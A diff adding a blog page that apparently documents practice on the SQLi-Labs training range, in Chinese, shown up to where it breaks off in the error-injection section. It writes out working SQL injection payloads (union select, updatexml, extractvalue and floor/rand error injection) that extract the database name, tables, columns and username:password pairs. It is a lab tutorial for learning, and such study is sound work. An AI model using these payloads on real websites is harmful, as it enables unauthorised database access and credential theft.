@@ -1,0 +1,640 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQLi-Labs | Jasmine_Iris</title><meta name="author" content="Jasmine_Iris"><meta name="copyright" content="Jasmine_Iris"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sqli-labs 靶场 SQL 注入练习：联合注入、报错注入、布尔盲注、时间盲注四种注入方式的判断与利用，以及 sqlmap 的使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi-Labs">
+<meta property="og:url" content="https://jasmine-iris.top/2026/08/21/SQLi-Labs/index.html">
+<meta property="og:site_name" content="Jasmine_Iris">
+<meta property="og:description" content="sqli-labs 靶场 SQL 注入练习：联合注入、报错注入、布尔盲注、时间盲注四种注入方式的判断与利用，以及 sqlmap 的使用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.jasmine-iris.top/img/photo.png">
+<meta property="article:published_time" content="2026-08-21T07:48:15.000Z">
+<meta property="article:modified_time" content="2026-08-21T07:48:21.257Z">
+<meta property="article:author" content="Jasmine_Iris">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.jasmine-iris.top/img/photo.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SQLi-Labs",
+  "url": "https://jasmine-iris.top/2026/08/21/SQLi-Labs/",
+  "image": "https://img.jasmine-iris.top/img/photo.png",
+  "datePublished": "2026-08-21T07:48:15.000Z",
+  "dateModified": "2026-08-21T07:48:21.257Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Jasmine_Iris",
+      "url": "https://jasmine-iris.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://img.jasmine-iris.top/img/photo.png"><link rel="canonical" href="https://jasmine-iris.top/2026/08/21/SQLi-Labs/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQLi-Labs',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>hr{border:none;border-top:1.5px dashed #c0c0c0;margin:1.5em 0;}</style><link rel="stylesheet" href="/css/light-bg13.css?v=7"><link rel="stylesheet" href="/css/top-img.css"><link rel="preload" as="image" href="https://img.jasmine-iris.top/img/miku-cinnamoroll-arrow-48.png"><link rel="stylesheet" href="/css/fix-flash.css?v=6"><style>#article-container h5{font-size:1.1em!important}#article-container h6{font-size:1em!important;font-weight:700!important}</style><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(https://img.jasmine-iris.top/img/bg.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://img.jasmine-iris.top/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar" loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Jasmine_Iris</span></a><a class="nav-page-title" href="/"><span class="site-name">SQLi-Labs</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQLi-Labs</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-08-21T07:48:15.000Z" title="发表于 2026-08-21 15:48:15">2026-08-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-21T07:48:21.257Z" title="更新于 2026-08-21 15:48:21">2026-08-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/SQL/">SQL</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
+<p>靶场搭建：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_82189125/article/details/136015200">https://blog.csdn.net/2302_82189125/article/details/136015200</a>‌‌‌‌‌‌‌‌‌​​‌​‌​‌‍‌‌‌‌‌‌‌‌‌​​‌‌‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​​‍‌‌‌‌‌‌‌‌‌​​‌​​‌​‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​‌​​​‌‍‌‌‌‌‌‌‌‌‌​​‌‌​‌​‍‌‌‌‌‌‌‌‌‌‌​‌​​‌​‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​‌‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​​‍‌‌‌‌‌‌‌‌‌‌​‌​​​‌‍‌‌‌‌‌‌‌‌‌​​​‌​‌‌‍‌‌‌‌‌‌‌‌‌​​‌​​​​‍‌‌‌‌‌‌‌‌‌​​​‌‌‌‌‍</p>
+</blockquote>
+<p>判断是否存在注入 –&gt; 判断用哪种注入 –&gt; 爆库→表→字段→数据</p>
+<table>
+<thead>
+<tr>
+<th>页面信号</th>
+<th>注入类型</th>
+<th>详细解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>页面<strong>回显查询结果</strong></td>
+<td>联合注入 union‑select</td>
+<td>页面会打印出数据库查询出来的数据。优先首选，速度最快；前提：有可利用的回显位，且前后查询列数一致。</td>
+</tr>
+<tr>
+<td>页面<strong>爆出 MySQL 原生报错信息</strong></td>
+<td>报错注入 updatexml /floor</td>
+<td>网站开启了错误回显，数据库报错内容打印在网页上；利用函数构造非法语句，<strong>把想要的数据带出到报错信息</strong>。</td>
+</tr>
+<tr>
+<td>没有数据、没有报错；页面只有两种状态：<strong>正常页面 / 异常页面</strong></td>
+<td>布尔盲注</td>
+<td>根据页面返回真假二选一的页面，猜字符；核心函数：<code>substr()</code><br>、<code>ascii()</code><br>，一条一条猜。</td>
+</tr>
+<tr>
+<td><strong>真假完全看不出区别，页面一模一样，只有响应速度不一样</strong></td>
+<td>时间盲注（延时注入）</td>
+<td>用<code>sleep()</code><br>、<code>benchmark()</code><br>制造延时，靠<strong>页面加载快慢</strong>判断条件真假；最慢，最后才用的兜底方案。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">加单引号'</span><br><span class="line">    ↓</span><br><span class="line">页面报错? → 是 → 报错注入</span><br><span class="line">    ↓否</span><br><span class="line">有查询数据回显？ → 是 → union联合注入</span><br><span class="line">    ↓否</span><br><span class="line">真假条件页面不一样？ → 是 → 布尔盲注</span><br><span class="line">    ↓否</span><br><span class="line">啥区别都没有 → 时间盲注</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="一、Basic-Challenges"><a href="#一、Basic-Challenges" class="headerlink" title="一、Basic Challenges"></a>一、Basic Challenges</h1><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298317150_jsc6o5.webp" loading='lazy'></p>
+<h2 id="1-1-Less-1"><a href="#1-1-Less-1" class="headerlink" title="1.1 Less-1"></a>1.1 Less-1</h2><h3 id="1-1-1-联合注入（union-select）"><a href="#1-1-1-联合注入（union-select）" class="headerlink" title="1.1.1 联合注入（union select）"></a>1.1.1 联合注入（union select）</h3><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298319587_xjko25.webp" loading='lazy'></p>
+<p>?id=1 页面正常</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298321311_jk70zi.webp" loading='lazy'></p>
+<h4 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1. 判断是否存在注入"></a>1. 判断是否存在注入</h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298322844_d4a5ec.webp" loading='lazy'></p>
+<p>报错，返回<code>''1'' LIMIT 0,1'</code>。根据 <code>'1''</code>，说明存在单引号字符型注入</p>
+<hr>
+<h4 id="2-验证闭合方式"><a href="#2-验证闭合方式" class="headerlink" title="2. 验证闭合方式"></a>2. 验证闭合方式</h4><p>注释符注释后面的 SQL 代码</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'--+</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>-- </code>是 SQL 的注释符，但是在 url 中空格会丢失，所以一般写成<code>--+</code></p>
+<p>URL 编码规则：<code>+</code> 在查询参数里 <strong>自动解码变成空格</strong></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298324659_lkfc97.webp" loading='lazy'></p>
+<p> 访问页面不再报错，证明单引号闭合有效。  </p>
+<hr>
+<h4 id="3-order-by-查询字段数"><a href="#3-order-by-查询字段数" class="headerlink" title="3. order by 查询字段数"></a>3. order by 查询字段数</h4><p><code>order by N</code> N 超出实际字段数量时页面报错。</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' order by 2--+</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298326360_gp8461.webp" loading='lazy'></p>
+<p>…</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298327961_klxukp.webp" loading='lazy'></p>
+<p>页面报错，说明一共有 3 个字段</p>
+<hr>
+<h4 id="4-union-查找回显位"><a href="#4-union-查找回显位" class="headerlink" title="4. union 查找回显位"></a>4. union 查找回显位</h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,2,3--+</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>注意这里使用 <code>-1</code> 或者其他数据库一定不存在的 id， 查询不到任何数据，页面只展示 union 后面我们自己写的查询结果。  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298329379_zqyms2.webp" loading='lazy'></p>
+<p> 第 2、第 3 字段可以在页面回显数据，后续查询数据库信息使用这两个点位。  </p>
+<hr>
+<h4 id="5-查找当前数据库名"><a href="#5-查找当前数据库名" class="headerlink" title="5. 查找当前数据库名"></a>5. 查找当前数据库名</h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,database(),3--+</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298331357_hriada.webp" loading='lazy'></p>
+<p>得到数据库名是：security</p>
+<hr>
+<h4 id="6-查找security-库中的所有表名"><a href="#6-查找security-库中的所有表名" class="headerlink" title="6. 查找security 库中的所有表名"></a>6. 查找security 库中的所有表名</h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='</span>security<span class="string">' --+</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298333004_d3ygp8.webp" loading='lazy'></p>
+<p> 获取数据表：<code>&lt;font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"&gt;emails,referers,uagents,users&lt;/font&gt;</code></p>
+<hr>
+<h4 id="7-查找-users-中的所有字段名"><a href="#7-查找-users-中的所有字段名" class="headerlink" title="7. 查找 users 中的所有字段名"></a>7. 查找 users 中的所有字段名</h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='</span>security<span class="string">' and table_name='</span>users<span class="string">' -- +</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298334695_pu1yyk.webp" loading='lazy'></p>
+<p> 获取字段：<code>&lt;font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"&gt;id,username,password&lt;/font&gt;</code></p>
+<hr>
+<h4 id="8-查找数据"><a href="#8-查找数据" class="headerlink" title="8. 查找数据"></a>8. 查找数据</h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,group_concat(username,'</span>:<span class="string">',password,'</span><span class="operator">&lt;</span>br<span class="operator">&gt;</span><span class="string">'),3 from users -- +</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里我加上了’<br>‘，方便对照查看账号和密码。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298336015_ochian.webp" loading='lazy'></p>
+<hr>
+<h3 id="1-1-2-报错注入"><a href="#1-1-2-报错注入" class="headerlink" title="1.1.2 报错注入"></a>1.1.2 报错注入</h3><h4 id="①-updatexml-–xpath报错"><a href="#①-updatexml-–xpath报错" class="headerlink" title="① updatexml()–xpath报错"></a>① updatexml()–<strong>xpath报错</strong></h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>, concat(<span class="number">0x5e</span>, (查询语句), <span class="number">0x5e</span>), <span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' and updatexml(1, concat(0x5e, database(), 0x5e), 1)--+    // 爆数据库</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>, concat(<span class="number">0x5e</span>, (<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">'security'</span>), <span class="number">0x5e</span>), <span class="number">1</span>)<span class="comment">--+		// 爆表名</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' and updatexml(1, concat(0x5e, (select group_concat(column_name) from information_schema.columns where table_schema='</span>security<span class="string">' and table_name='</span>users<span class="string">'), 0x5e), 1)--+		// 爆字段名</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>, concat(<span class="number">0x5e</span>, (<span class="keyword">select</span> concat(username,<span class="string">':'</span>,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>), <span class="number">0x5e</span>), <span class="number">1</span>)<span class="comment">--+		// 爆数据</span></span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>0x5e = ^ 分隔符；</p>
+<p>–+ = 注释掉后面的 LIMIT 0,1。</p>
+</blockquote>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298337817_75vxl9.webp" loading='lazy'></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298339063_3305iq.webp" loading='lazy'></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298340866_nd2zhl.webp" loading='lazy'></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298342091_lik8zv.webp" loading='lazy'></p>
+<blockquote>
+<p>limit 0,1 → 第 1 行 Dumb:Dumb</p>
+<p>limit 1,1 → 第 2 行 Angelina:I-kill-you</p>
+<p>limit 2,1 → 第 3 行 …</p>
+<p>因为<code>updatexml/extractvalue</code> 爆长数据用 <code>group_concat</code> 全拼起来超过 32 字符会被截断 → 用 <code>limit</code>或 <code>substr</code> 分段 都行</p>
+<!-- 这是一张图片，ocr 内容为： --><p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298343537_bsv7rk.webp" loading='lazy'></p>
+</blockquote>
+<hr>
+<h4 id="②extractvalue-–xpath报错"><a href="#②extractvalue-–xpath报错" class="headerlink" title="②extractvalue()–xpath报错"></a>②extractvalue()–<strong>xpath报错</strong></h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (查询语句), <span class="number">0x5c</span>))</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' and extractvalue(1, concat(0x5e, database(), 0x5e))--+    // 爆数据库</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5e</span>, (<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">'security'</span>), <span class="number">0x5e</span>))<span class="comment">--+		// 爆表名</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' and extractvalue(1, concat(0x5e, (select group_concat(column_name) from information_schema.columns where table_schema='</span>security<span class="string">' and table_name='</span>users<span class="string">'), 0x5e))--+		// 爆字段名</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5e</span>, (<span class="keyword">select</span> concat(username,<span class="string">':'</span>,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>), <span class="number">0x5e</span>))<span class="comment">--+		// 爆数据</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>回显结果同上</p>
+<hr>
+<h4 id="③-groupby重复键冲突"><a href="#③-groupby重复键冲突" class="headerlink" title="③ groupby重复键冲突"></a>③ groupby重复键冲突</h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="number">0x5e</span>,(目标查询语句),<span class="number">0x5e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' and (select 1 from (select count(*),concat(0x5e,database(),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)--+    // 爆数据库</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="number">0x5e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">'security'</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x5e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)<span class="comment">--+		// 爆表名</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' and (select 1 from (select count(*),concat(0x5e,(select column_name from information_schema.columns where table_schema='</span>security<span class="string">' and table_name='</span>users<span class="string">' limit 0,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)--+		// 爆字段名</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="number">0x5e</span>,(<span class="keyword">select</span> concat(username,<span class="string">':'</span>,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x5e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)<span class="comment">--+		// 爆数据</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298344923_xxkjld.webp" loading='lazy'></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298346201_mj2d5j.webp" loading='lazy'></p>
+<!-- 这是一张图片，ocr 内容为： -->
